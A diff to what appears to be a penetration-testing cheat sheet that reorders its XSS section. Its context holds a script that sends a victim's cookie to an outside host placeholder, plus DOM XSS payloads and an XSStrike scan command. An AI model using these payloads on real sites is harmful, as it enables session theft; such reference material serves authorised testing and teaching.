@@ -465,16 +465,17 @@ CTRL + U
 <script>new Image().src='http://<IP address>/index.php?c='+document.cookie</script>	
 ```
 
-- Automated XSS
-
-```
-$ python xsstrike.py -u "http://<Domain Name>/index.php?task=test"	
-```
-
 - DOM XSS Payloads
 
 ```
 #"><img src=/ onerror=alert(document.cookie)>
+<img src="" onerror=alert(window.origin)>
+```
+
+- Automated XSS
+
+```
+$ python xsstrike.py -u "http://<Domain Name>/index.php?task=test"	
 ```
 
 #11. - Cross-Site Request Forgery (CSRF)
